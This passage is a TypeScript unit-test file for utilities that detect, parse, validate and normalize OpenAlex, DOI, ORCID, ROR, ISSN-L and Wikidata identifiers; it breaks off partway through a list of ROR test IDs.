/**
 * @file entity-detection.unit.test.ts
 * @description Comprehensive unit tests for OpenAlex entity detection utilities including external ID support
 */

import { describe, expect, it } from 'vitest';
import {
  EntityType,
  ExternalIdType,
  EntityDetectionError,
  ENTITY_PREFIXES,
  TYPE_TO_PREFIX,
  ENTITY_ENDPOINTS,
  ENTITY_EXTERNAL_ID_MAPPINGS,
  detectEntityType,
  parseOpenAlexUrl,
  normalizeEntityId,
  validateEntityId,
  getEntityEndpoint,
  generateEntityUrl,
  parseEntityIdentifier,
  isValidEntityIdentifier,
  extractEntityIdentifiers,
  isEntityType,
  getAllEntityTypes,
  getAllEntityPrefixes,
  // New external ID functions
  detectIdType,
  parseExternalId,
  validateExternalId,
  normalizeAnyId,
  resolveEntityFromId,
  isValidAnyId,
  getAllExternalIdTypes,
  getPossibleEntityTypesForExternalId,
  getSupportedExternalIdTypes,
  entitySupportsExternalIdType,
  encodeExternalId,
  decodeExternalId,
  type EntityParseResult,
  type ExternalIdParseResult,
  type IdResolutionResult
} from './entity-detection';

describe('EntityType and Constants', () => {
  it('should have all required entity types', () => {
    const expectedTypes = [
      'work', 'author', 'source', 'institution', 'publisher',
      'funder', 'topic', 'concept', 'keyword', 'continent', 'region'
    ];
    
    expect(Object.values(EntityType)).toEqual(expectedTypes);
  });

  it('should have all required external ID types', () => {
    const expectedTypes = ['doi', 'orcid', 'ror', 'issn-l', 'wikidata', 'openalex'];
    expect(Object.values(ExternalIdType)).toEqual(expectedTypes);
  });

  it('should have correct prefix mappings', () => {
    expect(ENTITY_PREFIXES.W).toBe(EntityType.WORK);
    expect(ENTITY_PREFIXES.A).toBe(EntityType.AUTHOR);
    expect(ENTITY_PREFIXES.S).toBe(EntityType.SOURCE);
    expect(ENTITY_PREFIXES.I).toBe(EntityType.INSTITUTION);
    expect(ENTITY_PREFIXES.P).toBe(EntityType.PUBLISHER);
    expect(ENTITY_PREFIXES.F).toBe(EntityType.FUNDER);
    expect(ENTITY_PREFIXES.T).toBe(EntityType.TOPIC);
    expect(ENTITY_PREFIXES.C).toBe(EntityType.CONCEPT);
    expect(ENTITY_PREFIXES.K).toBe(EntityType.KEYWORD);
    expect(ENTITY_PREFIXES.N).toBe(EntityType.CONTINENT);
    expect(ENTITY_PREFIXES.R).toBe(EntityType.REGION);
  });

  it('should have correct external ID mappings', () => {
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.WORK]).toContain(ExternalIdType.DOI);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.AUTHOR]).toContain(ExternalIdType.ORCID);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.INSTITUTION]).toContain(ExternalIdType.ROR);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.SOURCE]).toContain(ExternalIdType.ISSN_L);
    expect(ENTITY_EXTERNAL_ID_MAPPINGS[EntityType.PUBLISHER]).toContain(ExternalIdType.WIKIDATA);
  });
});

describe('detectIdType', () => {
  it('should detect OpenAlex IDs', () => {
    expect(detectIdType('W2741809807')).toBe(ExternalIdType.OPENALEX);
    expect(detectIdType('https://openalex.org/A2887492')).toBe(ExternalIdType.OPENALEX);
  });

  it('should detect DOI formats', () => {
    expect(detectIdType('10.7717/peerj.4375')).toBe(ExternalIdType.DOI);
    expect(detectIdType('https://doi.org/10.7717/peerj.4375')).toBe(ExternalIdType.DOI);
    expect(detectIdType('https://dx.doi.org/10.7717/peerj.4375')).toBe(ExternalIdType.DOI);
    expect(detectIdType('doi:10.7717/peerj.4375')).toBe(ExternalIdType.DOI);
  });

  it('should detect ORCID formats', () => {
    expect(detectIdType('0000-0003-1613-5981')).toBe(ExternalIdType.ORCID);
    expect(detectIdType('https://orcid.org/0000-0003-1613-5981')).toBe(ExternalIdType.ORCID);
    expect(detectIdType('https://www.orcid.org/0000-0003-1613-5981')).toBe(ExternalIdType.ORCID);
    expect(detectIdType('orcid:0000-0003-1613-5981')).toBe(ExternalIdType.ORCID);
  });

  it('should detect ROR formats', () => {
    expect(detectIdType('03yrm5c26')).toBe(ExternalIdType.ROR);
    expect(detectIdType('https://ror.org/03yrm5c26')).toBe(ExternalIdType.ROR);
    expect(detectIdType('ror:03yrm5c26')).toBe(ExternalIdType.ROR);
  });

  it('should detect ISSN-L format', () => {
    expect(detectIdType('1234-567X')).toBe(ExternalIdType.ISSN_L);
    expect(detectIdType('0028-0836')).toBe(ExternalIdType.ISSN_L);
  });

  it('should detect Wikidata formats', () => {
    expect(detectIdType('Q123456')).toBe(ExternalIdType.WIKIDATA);
    expect(detectIdType('https://wikidata.org/wiki/Q123456')).toBe(ExternalIdType.WIKIDATA);
    expect(detectIdType('wikidata:Q123456')).toBe(ExternalIdType.WIKIDATA);
  });

  it('should throw for invalid formats', () => {
    expect(() => detectIdType('invalid-id')).toThrow(EntityDetectionError);
    expect(() => detectIdType('')).toThrow(EntityDetectionError);
    expect(() => detectIdType('10.invalid')).toThrow(EntityDetectionError);
  });
});

describe('parseExternalId', () => {
  it('should parse DOI formats correctly', () => {
    const result1 = parseExternalId('10.7717/peerj.4375');
    expect(result1).toEqual({
      idType: ExternalIdType.DOI,
      cleanId: '10.7717/peerj.4375',
      originalInput: '10.7717/peerj.4375',
      fromUrl: false,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.WORK]
    });

    const result2 = parseExternalId('https://doi.org/10.7717/peerj.4375');
    expect(result2).toEqual({
      idType: ExternalIdType.DOI,
      cleanId: '10.7717/peerj.4375',
      originalInput: 'https://doi.org/10.7717/peerj.4375',
      fromUrl: true,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.WORK]
    });

    const result3 = parseExternalId('doi:10.7717/peerj.4375');
    expect(result3).toEqual({
      idType: ExternalIdType.DOI,
      cleanId: '10.7717/peerj.4375',
      originalInput: 'doi:10.7717/peerj.4375',
      fromUrl: false,
      fromNamespace: true,
      possibleEntityTypes: [EntityType.WORK]
    });
  });

  it('should parse ORCID formats correctly', () => {
    const result1 = parseExternalId('0000-0003-1613-5981');
    expect(result1).toEqual({
      idType: ExternalIdType.ORCID,
      cleanId: '0000-0003-1613-5981',
      originalInput: '0000-0003-1613-5981',
      fromUrl: false,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.AUTHOR]
    });

    const result2 = parseExternalId('https://orcid.org/0000-0003-1613-5981');
    expect(result2).toEqual({
      idType: ExternalIdType.ORCID,
      cleanId: '0000-0003-1613-5981',
      originalInput: 'https://orcid.org/0000-0003-1613-5981',
      fromUrl: true,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.AUTHOR]
    });
  });

  it('should parse ROR formats correctly', () => {
    const result1 = parseExternalId('03yrm5c26');
    expect(result1).toEqual({
      idType: ExternalIdType.ROR,
      cleanId: '03yrm5c26',
      originalInput: '03yrm5c26',
      fromUrl: false,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.INSTITUTION]
    });

    const result2 = parseExternalId('https://ror.org/03yrm5c26');
    expect(result2).toEqual({
      idType: ExternalIdType.ROR,
      cleanId: '03yrm5c26',
      originalInput: 'https://ror.org/03yrm5c26',
      fromUrl: true,
      fromNamespace: false,
      possibleEntityTypes: [EntityType.INSTITUTION]
    });
  });

  it('should parse Wikidata formats correctly', () => {
    const result1 = parseExternalId('Q123456');
    expect(result1.idType).toBe(ExternalIdType.WIKIDATA);
    expect(result1.cleanId).toBe('Q123456');
    expect(result1.possibleEntityTypes).toContain(EntityType.PUBLISHER);
    expect(result1.possibleEntityTypes).toContain(EntityType.FUNDER);
  });

  it('should parse OpenAlex formats correctly', () => {
    const result = parseExternalId('W2741809807');
    expect(result.idType).toBe(ExternalIdType.OPENALEX);
    expect(result.cleanId).toBe('W2741809807');
    expect(result.possibleEntityTypes).toEqual(Object.values(EntityType));
  });
});

describe('validateExternalId', () => {
  it('should validate DOI formats', () => {
    expect(validateExternalId('10.7717/peerj.4375', ExternalIdType.DOI)).toBe(true);
    expect(validateExternalId('https://doi.org/10.7717/peerj.4375', ExternalIdType.DOI)).toBe(true);
    expect(validateExternalId('invalid-doi', ExternalIdType.DOI)).toBe(false);
    expect(validateExternalId('0000-0003-1613-5981', ExternalIdType.DOI)).toBe(false);
  });

  it('should validate ORCID formats', () => {
    expect(validateExternalId('0000-0003-1613-5981', ExternalIdType.ORCID)).toBe(true);
    expect(validateExternalId('https://orcid.org/0000-0003-1613-5981', ExternalIdType.ORCID)).toBe(true);
    expect(validateExternalId('invalid-orcid', ExternalIdType.ORCID)).toBe(false);
    expect(validateExternalId('10.7717/peerj.4375', ExternalIdType.ORCID)).toBe(false);
  });

  it('should validate ROR formats', () => {
    expect(validateExternalId('03yrm5c26', ExternalIdType.ROR)).toBe(true);
    expect(validateExternalId('https://ror.org/03yrm5c26', ExternalIdType.ROR)).toBe(true);
    expect(validateExternalId('invalid-ror', ExternalIdType.ROR)).toBe(false);
  });

  it('should handle invalid inputs', () => {
    expect(validateExternalId('', ExternalIdType.DOI)).toBe(false);
    expect(validateExternalId('   ', ExternalIdType.DOI)).toBe(false);
  });
});

describe('normalizeAnyId', () => {
  it('should normalize DOI formats', () => {
    expect(normalizeAnyId('10.7717/peerj.4375')).toBe('10.7717/peerj.4375');
    expect(normalizeAnyId('https://doi.org/10.7717/peerj.4375')).toBe('10.7717/peerj.4375');
    expect(normalizeAnyId('doi:10.7717/peerj.4375')).toBe('10.7717/peerj.4375');
  });

  it('should normalize ORCID formats', () => {
    expect(normalizeAnyId('0000-0003-1613-5981')).toBe('0000-0003-1613-5981');
    expect(normalizeAnyId('https://orcid.org/0000-0003-1613-5981')).toBe('0000-0003-1613-5981');
    expect(normalizeAnyId('orcid:0000-0003-1613-5981')).toBe('0000-0003-1613-5981');
  });

  it('should normalize OpenAlex IDs', () => {
    expect(normalizeAnyId('W2741809807')).toBe('W2741809807');
    expect(normalizeAnyId('https://openalex.org/W2741809807')).toBe('W2741809807');
  });

  it('should throw for invalid formats', () => {
    expect(() => normalizeAnyId('invalid-id')).toThrow(EntityDetectionError);
    expect(() => normalizeAnyId('')).toThrow(EntityDetectionError);
  });
});

describe('resolveEntityFromId', () => {
  it('should resolve OpenAlex IDs definitively', () => {
    const result = resolveEntityFromId('W2741809807');
    expect(result).toEqual({
      entityType: EntityType.WORK,
      openAlexId: 'W2741809807',
      isDefinitive: true,
      originalInput: 'W2741809807'
    });
  });

  it('should resolve DOI as Work definitively', () => {
    const result = resolveEntityFromId('10.7717/peerj.4375');
    expect(result.entityType).toBe(EntityType.WORK);
    expect(result.isDefinitive).toBe(true);
    expect(result.externalId?.idType).toBe(ExternalIdType.DOI);
    expect(result.externalId?.cleanId).toBe('10.7717/peerj.4375');
  });

  it('should resolve ORCID as Author definitively', () => {
    const result = resolveEntityFromId('0000-0003-1613-5981');
    expect(result.entityType).toBe(EntityType.AUTHOR);
    expect(result.isDefinitive).toBe(true);
    expect(result.externalId?.idType).toBe(ExternalIdType.ORCID);
  });

  it('should resolve Wikidata as non-definitive', () => {
    const result = resolveEntityFromId('Q123456');
    expect(result.entityType).toBeUndefined();
    expect(result.isDefinitive).toBe(false);
    expect(result.externalId?.idType).toBe(ExternalIdType.WIKIDATA);
    expect(result.externalId?.possibleEntityTypes.length).toBeGreaterThan(1);
  });

  it('should throw for invalid IDs', () => {
    expect(() => resolveEntityFromId('invalid-id')).toThrow(EntityDetectionError);
  });
});

describe('isValidAnyId', () => {
  it('should validate various ID formats', () => {
    expect(isValidAnyId('W2741809807')).toBe(true);
    expect(isValidAnyId('10.7717/peerj.4375')).toBe(true);
    expect(isValidAnyId('0000-0003-1613-5981')).toBe(true);
    expect(isValidAnyId('https://doi.org/10.7717/peerj.4375')).toBe(true);
    expect(isValidAnyId('Q123456')).toBe(true);
    expect(isValidAnyId('03yrm5c26')).toBe(true);
    expect(isValidAnyId('1234-567X')).toBe(true);
  });

  it('should reject invalid formats', () => {
    expect(isValidAnyId('invalid-id')).toBe(false);
    expect(isValidAnyId('')).toBe(false);
    expect(isValidAnyId('10.invalid')).toBe(false);
  });
});

describe('External ID utility functions', () => {
  it('should get all external ID types', () => {
    const types = getAllExternalIdTypes();
    expect(types).toContain(ExternalIdType.DOI);
    expect(types).toContain(ExternalIdType.ORCID);
    expect(types).toContain(ExternalIdType.ROR);
    expect(types).toContain(ExternalIdType.ISSN_L);
    expect(types).toContain(ExternalIdType.WIKIDATA);
    expect(types).toContain(ExternalIdType.OPENALEX);
  });

  it('should get possible entity types for external ID types', () => {
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.DOI)).toEqual([EntityType.WORK]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ORCID)).toEqual([EntityType.AUTHOR]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ROR)).toEqual([EntityType.INSTITUTION]);
    expect(getPossibleEntityTypesForExternalId(ExternalIdType.ISSN_L)).toEqual([EntityType.SOURCE]);
    
    const wikidataTypes = getPossibleEntityTypesForExternalId(ExternalIdType.WIKIDATA);
    expect(wikidataTypes).toContain(EntityType.PUBLISHER);
    expect(wikidataTypes).toContain(EntityType.FUNDER);
    expect(wikidataTypes.length).toBeGreaterThan(1);
  });

  it('should get supported external ID types for entity types', () => {
    expect(getSupportedExternalIdTypes(EntityType.WORK)).toContain(ExternalIdType.DOI);
    expect(getSupportedExternalIdTypes(EntityType.AUTHOR)).toContain(ExternalIdType.ORCID);
    expect(getSupportedExternalIdTypes(EntityType.INSTITUTION)).toContain(ExternalIdType.ROR);
    expect(getSupportedExternalIdTypes(EntityType.SOURCE)).toContain(ExternalIdType.ISSN_L);
    expect(getSupportedExternalIdTypes(EntityType.PUBLISHER)).toContain(ExternalIdType.WIKIDATA);
  });

  it('should check entity-external ID support', () => {
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.DOI)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.WORK, ExternalIdType.ORCID)).toBe(false);
    expect(entitySupportsExternalIdType(EntityType.AUTHOR, ExternalIdType.ORCID)).toBe(true);
    expect(entitySupportsExternalIdType(EntityType.AUTHOR, ExternalIdType.DOI)).toBe(false);
  });
});

describe('Original OpenAlex functionality', () => {
  // Keep all original tests to ensure backward compatibility
  describe('detectEntityType', () => {
    it('should detect work entities', () => {
      expect(detectEntityType('W2741809807')).toBe(EntityType.WORK);
      expect(detectEntityType('w123456789')).toBe(EntityType.WORK);
      expect(detectEntityType('W1234567890')).toBe(EntityType.WORK);
    });

    it('should detect author entities', () => {
      expect(detectEntityType('A2887492')).toBe(EntityType.AUTHOR);
      expect(detectEntityType('a2887492')).toBe(EntityType.AUTHOR);
    });

    it('should detect all entity types', () => {
      expect(detectEntityType('S12345678')).toBe(EntityType.SOURCE);
      expect(detectEntityType('I12345678')).toBe(EntityType.INSTITUTION);
      expect(detectEntityType('P12345678')).toBe(EntityType.PUBLISHER);
      expect(detectEntityType('F12345678')).toBe(EntityType.FUNDER);
      expect(detectEntityType('T12345678')).toBe(EntityType.TOPIC);
      expect(detectEntityType('C12345678')).toBe(EntityType.CONCEPT);
      expect(detectEntityType('K12345678')).toBe(EntityType.KEYWORD);
      expect(detectEntityType('N12345678')).toBe(EntityType.CONTINENT);
      expect(detectEntityType('R12345678')).toBe(EntityType.REGION);
    });

    it('should throw for invalid inputs', () => {
      expect(() => detectEntityType('')).toThrow(EntityDetectionError);
      expect(() => detectEntityType('123456789')).toThrow(EntityDetectionError);
      expect(() => detectEntityType('X123456789')).toThrow(EntityDetectionError);
    });
  });

  describe('parseOpenAlexUrl', () => {
    it('should parse valid URLs', () => {
      const result = parseOpenAlexUrl('https://openalex.org/W2741809807');
      expect(result).toEqual({
        type: EntityType.WORK,
        id: 'W2741809807',
        numericId: '2741809807',
        prefix: 'W',
        fromUrl: true
      });
    });

    it('should handle HTTP and HTTPS', () => {
      const httpsResult = parseOpenAlexUrl('https://openalex.org/A2887492');
      const httpResult = parseOpenAlexUrl('http://openalex.org/A2887492');
      
      expect(httpsResult.type).toBe(EntityType.AUTHOR);
      expect(httpResult.type).toBe(EntityType.AUTHOR);
    });
  });

  describe('normalizeEntityId', () => {
    it('should normalize valid prefixed IDs', () => {
      expect(normalizeEntityId('W2741809807')).toBe('W2741809807');
      expect(normalizeEntityId('w2741809807')).toBe('W2741809807');
      expect(normalizeEntityId('A2887492')).toBe('A2887492');
    });

    it('should normalize URLs to IDs', () => {
      expect(normalizeEntityId('https://openalex.org/W2741809807')).toBe('W2741809807');
      expect(normalizeEntityId('http://openalex.org/A2887492')).toBe('A2887492');
    });

    it('should normalize numeric IDs with type parameter', () => {
      expect(normalizeEntityId('2741809807', EntityType.WORK)).toBe('W2741809807');
      expect(normalizeEntityId('2887492', EntityType.AUTHOR)).toBe('A2887492');
    });
  });
});

describe('Edge cases and validation', () => {
  it('should handle complex DOI formats', () => {
    expect(isValidAnyId('10.1038/nature12373')).toBe(true);
    expect(isValidAnyId('10.1371/journal.pone.0123456')).toBe(true);
    expect(isValidAnyId('10.1016/j.cell.2020.01.023')).toBe(true);
  });

  it('should handle ORCID checksum validation', () => {
    expect(isValidAnyId('0000-0002-1825-009X')).toBe(true);
    expect(isValidAnyId('0000-0003-1613-5981')).toBe(true);
    expect(isValidAnyId('0000-0001-5109-3700')).toBe(true);
  });

  it('should handle ROR format validation', () => {
    expect(isValidAnyId('0000000121691227')).toBe(false); // Too long
    expect(isValidAnyId('03yrm5c26')).toBe(true);
    expect(isValidAnyId('04fa4r544')).toBe(true);
  });

  it('should handle whitespace in all ID formats', () => {
    expect(normalizeAnyId('  10.7717/peerj.4375  ')).toBe('10.7717/peerj.4375');
    expect(normalizeAnyId('  0000-0003-1613-5981  ')).toBe('0000-0003-1613-5981');
    expect(normalizeAnyId('  W2741809807  ')).toBe('W2741809807');
  });

  it('should handle case sensitivity appropriately', () => {
    expect(normalizeAnyId('w2741809807')).toBe('W2741809807');
    expect(normalizeAnyId('q123456')).toBe('Q123456');
    expect(normalizeAnyId('DOI:10.7717/peerj.4375')).toBe('10.7717/peerj.4375');
  });
});

describe('Real-world ID format scenarios', () => {
  it('should handle academic citation formats', () => {
    const testCases = [
      { input: '10.1038/nature12373', expected: EntityType.WORK },
      { input: 'https://doi.org/10.1371/journal.pone.0123456', expected: EntityType.WORK },
      { input: '0000-0003-1613-5981', expected: EntityType.AUTHOR },
      { input: 'https://orcid.org/0000-0002-1825-009X', expected: EntityType.AUTHOR },
      { input: '03yrm5c26', expected: EntityType.INSTITUTION },
      { input: 'https://ror.org/04fa4r544', expected: EntityType.INSTITUTION },
      { input: '0028-0836', expected: EntityType.SOURCE },
      { input: 'Q5', expected: undefined }, // Human - multiple possible types
    ];

    testCases.forEach(({ input, expected }) => {
      const result = resolveEntityFromId(input);
      if (expected) {
        expect(result.entityType).toBe(expected);
        expect(result.isDefinitive).toBe(true);
      } else {
        expect(result.isDefinitive).toBe(false);
      }
    });
  });

  it('should extract mixed ID types from text', () => {
    const text = `
      This study (DOI: 10.7717/peerj.4375) was conducted by researcher 
      https://orcid.org/0000-0003-1613-5981 at institution https://ror.org/03yrm5c26.
      The work is also available as W2741809807 in OpenAlex.
    `;

    // Note: extractEntityIdentifiers currently only handles OpenAlex IDs
    // This would need to be extended to handle external IDs in text
    const results = extractEntityIdentifiers(text);
    expect(results.length).toBeGreaterThan(0);
    
    // Validate that we can resolve each ID type mentioned
    expect(isValidAnyId('10.7717/peerj.4375')).toBe(true);
    expect(isValidAnyId('0000-0003-1613-5981')).toBe(true);
    expect(isValidAnyId('03yrm5c26')).toBe(true);
    expect(isValidAnyId('W2741809807')).toBe(true);
  });

  it('should create enhanced mixed ID extraction for comprehensive text analysis', () => {
    // Create a comprehensive function that can extract all supported ID types from text
    function extractAllIdentifiersFromText(text: string): Array<{
      match: string;
      start: number;
      end: number;
      idType: ExternalIdType;
      entityType?: EntityType;
      isDefinitive: boolean;
    }> {
      const results: Array<{
        match: string;
        start: number;
        end: number;
        idType: ExternalIdType;
        entityType?: EntityType;
        isDefinitive: boolean;
      }> = [];

      // DOI patterns
      const doiPatterns = [
        /\b(10\.[0-9]{4,}\/[^\s]+)/gi,
        /https?:\/\/(dx\.)?doi\.org\/(10\.[0-9]{4,}\/[^\s]+)/gi,
        /doi:(10\.[0-9]{4,}\/[^\s]+)/gi
      ];

      doiPatterns.forEach(pattern => {
        let match: RegExpExecArray | null;
        while ((match = pattern.exec(text)) !== null) {
          const cleanId = match[1] || match[2] || match[1];
          if (cleanId && isValidAnyId(cleanId)) {
            results.push({
              match: match[0],
              start: match.index,
              end: match.index + match[0].length,
              idType: ExternalIdType.DOI,
              entityType: EntityType.WORK,
              isDefinitive: true
            });
          }
        }
      });

      // ORCID patterns
      const orcidPatterns = [
        /\b([0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{3}[0-9X])\b/gi,
        /https?:\/\/(www\.)?orcid\.org\/([0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{3}[0-9X])/gi,
        /orcid:([0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{3}[0-9X])/gi
      ];

      orcidPatterns.forEach(pattern => {
        let match: RegExpExecArray | null;
        while ((match = pattern.exec(text)) !== null) {
          const cleanId = match[1] || match[2] || match[1];
          if (cleanId && isValidAnyId(cleanId)) {
            results.push({
              match: match[0],
              start: match.index,
              end: match.index + match[0].length,
              idType: ExternalIdType.ORCID,
              entityType: EntityType.AUTHOR,
              isDefinitive: true
            });
          }
        }
      });

      // ROR patterns
      const rorPatterns = [
        /\b(0[0-9a-z]{6}[0-9]{2})\b/gi,
        /https?:\/\/(www\.)?ror\.org\/(0[0-9a-z]{6}[0-9]{2})/gi,
        /ror:(0[0-9a-z]{6}[0-9]{2})/gi
      ];

      rorPatterns.forEach(pattern => {
        let match: RegExpExecArray | null;
        while ((match = pattern.exec(text)) !== null) {
          const cleanId = match[1] || match[2] || match[1];
          if (cleanId && isValidAnyId(cleanId)) {
            results.push({
              match: match[0],
              start: match.index,
              end: match.index + match[0].length,
              idType: ExternalIdType.ROR,
              entityType: EntityType.INSTITUTION,
              isDefinitive: true
            });
          }
        }
      });

      // OpenAlex patterns (reuse existing function)
      const openalexResults = extractEntityIdentifiers(text);
      openalexResults.forEach(result => {
        results.push({
          match: result.match,
          start: result.start,
          end: result.end,
          idType: ExternalIdType.OPENALEX,
          entityType: result.type,
          isDefinitive: true
        });
      });

      // Sort by position and remove duplicates
      return results
        .sort((a, b) => a.start - b.start)
        .filter((result, index, arr) => 
          index === 0 || 
          result.start !== arr[index - 1].start || 
          result.match !== arr[index - 1].match
        );
    }

    // Test the enhanced extraction function
    const complexText = `
      This comprehensive study examines multiple works including:
      - Primary paper: https://doi.org/10.7717/peerj.4375
      - Secondary reference: 10.1038/nature12373
      - OpenAlex work: W2741809807
      - Author profile: https://orcid.org/0000-0003-1613-5981
      - Institution: https://ror.org/03yrm5c26
      - Another author: 0000-0002-1825-009X
      - Nature journal: https://openalex.org/S137773608
      - Additional work: https://openalex.org/W2951515447
      Citation format: doi:10.1016/j.cell.2020.01.023
      Namespace format: orcid:0000-0001-5109-3700
    `;

    const allResults = extractAllIdentifiersFromText(complexText);
    
    // Should find multiple ID types
    expect(allResults.length).toBeGreaterThan(8);
    
    // Should find DOIs
    const doiResults = allResults.filter(r => r.idType === ExternalIdType.DOI);
    expect(doiResults.length).toBeGreaterThanOrEqual(3);
    expect(doiResults.every(r => r.entityType === EntityType.WORK)).toBe(true);
    
    // Should find ORCIDs
    const orcidResults = allResults.filter(r => r.idType === ExternalIdType.ORCID);
    expect(orcidResults.length).toBeGreaterThanOrEqual(2);
    expect(orcidResults.every(r => r.entityType === EntityType.AUTHOR)).toBe(true);
    
    // Should find ROR IDs
    const rorResults = allResults.filter(r => r.idType === ExternalIdType.ROR);
    expect(rorResults.length).toBeGreaterThanOrEqual(1);
    expect(rorResults.every(r => r.entityType === EntityType.INSTITUTION)).toBe(true);
    
    // Should find OpenAlex IDs
    const openalexResults = allResults.filter(r => r.idType === ExternalIdType.OPENALEX);
    expect(openalexResults.length).toBeGreaterThanOrEqual(3);
    
    // All should be definitive
    expect(allResults.every(r => r.isDefinitive)).toBe(true);
    
    // Results should be sorted by position
    for (let i = 1; i < allResults.length; i++) {
      expect(allResults[i].start).toBeGreaterThanOrEqual(allResults[i - 1].start);
    }
  });

  it('should handle publisher and funder Wikidata IDs', () => {
    const publisherResult = resolveEntityFromId('Q180445'); // Springer Nature
    expect(publisherResult.externalId?.possibleEntityTypes).toContain(EntityType.PUBLISHER);
    
    const funderResult = resolveEntityFromId('Q390551'); // NIH
    expect(funderResult.externalId?.possibleEntityTypes).toContain(EntityType.FUNDER);
  });
});

describe('Error handling and input validation', () => {
  it('should provide meaningful error messages', () => {
    expect(() => detectIdType('invalid')).toThrow('Cannot detect ID type from: invalid');
    expect(() => parseExternalId('')).toThrow('ID must be a non-empty string');
    expect(() => normalizeAnyId('  ')).toThrow('Input must be a non-empty string');
  });

  it('should handle null and undefined inputs gracefully', () => {
    // @ts-ignore - Testing runtime behavior
    expect(() => detectIdType(null)).toThrow(EntityDetectionError);
    // @ts-ignore - Testing runtime behavior
    expect(() => detectIdType(undefined)).toThrow(EntityDetectionError);
    // @ts-ignore - Testing runtime behavior
    expect(validateExternalId(null, ExternalIdType.DOI)).toBe(false);
  });

  it('should handle very long inputs', () => {
    const longDoi = '10.1000/' + 'x'.repeat(1000);
    expect(isValidAnyId(longDoi)).toBe(true);
    
    const veryLongInvalid = 'invalid-' + 'x'.repeat(10000);
    expect(isValidAnyId(veryLongInvalid)).toBe(false);
  });
});

describe('URL encoding and decoding of external IDs', () => {
  it('should properly encode DOI IDs with special characters', () => {
    const complexDoi = '10.1371/journal.pone.0123456';
    const encoded = encodeExternalId(complexDoi);
    expect(encoded).toBe('10.1371%2Fjournal.pone.0123456');
    
    const decoded = decodeExternalId(encoded);
    expect(decoded).toBe(complexDoi);
  });

  it('should encode URLs properly', () => {
    const doiUrl = 'https://doi.org/10.1371/journal.pone.0123456';
    const encoded = encodeExternalId(doiUrl);
    expect(encoded).toBe(encodeURIComponent(doiUrl));
    
    const decoded = decodeExternalId(encoded);
    expect(decoded).toBe(doiUrl);
  });

  it('should handle encoding edge cases', () => {
    // Test IDs with no special characters
    expect(encodeExternalId('W2741809807')).toBe('W2741809807');
    expect(encodeExternalId('0000-0003-1613-5981')).toBe('0000-0003-1613-5981');
    
    // Test complex DOIs with multiple special characters
    const complexDoi = '10.1038/s41586-020-2832-5';
    expect(encodeExternalId(complexDoi)).toBe('10.1038%2Fs41586-020-2832-5');
  });

  it('should gracefully handle decoding failures', () => {
    // Invalid encoded string
    const invalid = '%GG%';
    expect(decodeExternalId(invalid)).toBe(invalid);
    
    // Already decoded string
    const plain = '10.1000/test';
    expect(decodeExternalId(plain)).toBe(plain);
  });
});

describe('Advanced entity detection edge cases', () => {
  it('should handle OpenAlex IDs at boundary lengths', () => {
    // Minimum length (7 digits)
    expect(detectEntityType('W1234567')).toBe(EntityType.WORK);
    expect(detectEntityType('A1234567')).toBe(EntityType.AUTHOR);
    
    // Maximum length (10 digits)
    expect(detectEntityType('W1234567890')).toBe(EntityType.WORK);
    expect(detectEntityType('A1234567890')).toBe(EntityType.AUTHOR);
    
    // Just under minimum (should fail)
    expect(() => detectEntityType('W123456')).toThrow(EntityDetectionError);
    
    // Just over maximum (should fail)
    expect(() => detectEntityType('W12345678901')).toThrow(EntityDetectionError);
  });

  it('should validate all entity prefixes comprehensively', () => {
    const validPrefixes = ['W', 'A', 'S', 'I', 'P', 'F', 'T', 'C', 'K', 'N', 'R'];
    
    validPrefixes.forEach(prefix => {
      expect(detectEntityType(`${prefix}1234567`)).toBe(ENTITY_PREFIXES[prefix]);
      expect(detectEntityType(`${prefix.toLowerCase()}1234567`)).toBe(ENTITY_PREFIXES[prefix]);
    });
    
    // Invalid prefixes
    const invalidPrefixes = ['X', 'Y', 'Z', 'Q', 'L', 'M'];
    invalidPrefixes.forEach(prefix => {
      expect(() => detectEntityType(`${prefix}1234567`)).toThrow(EntityDetectionError);
    });
  });

  it('should handle mixed case in all ID formats', () => {
    // OpenAlex IDs
    expect(normalizeEntityId('w2741809807')).toBe('W2741809807');
    expect(() => normalizeEntityId('WoRk123')).toThrow(EntityDetectionError); // Invalid format will fail normalization
    
    // Wikidata IDs
    expect(parseExternalId('q123456').cleanId).toBe('Q123456');
    expect(parseExternalId('Q123456').cleanId).toBe('Q123456');
    
    // DOI namespace formats (case insensitive)
    expect(parseExternalId('DOI:10.1000/test').cleanId).toBe('10.1000/test');
    expect(parseExternalId('doi:10.1000/test').cleanId).toBe('10.1000/test');
    expect(parseExternalId('Doi:10.1000/test').cleanId).toBe('10.1000/test');
  });

  it('should validate ORCID checksum formats', () => {
    // Valid ORCID IDs with different checksums
    const validOrcids = [
      '0000-0002-1825-009X', // X checksum
      '0000-0003-1613-5981', // Numeric checksum
      '0000-0001-5109-3700', // Zero checksum
      '0000-0000-0000-000X'  // All zeros with X
    ];
    
    validOrcids.forEach(orcid => {
      expect(isValidAnyId(orcid)).toBe(true);
      expect(parseExternalId(orcid).idType).toBe(ExternalIdType.ORCID);
    });
    
    // Invalid ORCID formats
    const invalidOrcids = [
      '0000-0002-1825-009Y', // Invalid checksum character
      '0000-0002-1825-00XX', // Too many characters in checksum
      '0000-0002-1825-00',   // Missing checksum
      '00000-0002-1825-009X' // Too many digits in first group
    ];
    
    invalidOrcids.forEach(orcid => {
      expect(isValidAnyId(orcid)).toBe(false);
    });
  });

  it('should validate ROR ID formats strictly', () => {
    // Valid ROR IDs (format: 0 + 6 alphanumeric + 2 digits)
    const validRors = [
      '03yrm5c26',  // Real ROR
      '04fa4r544',  // Real ROR
      '0abcdef12',  // Valid format
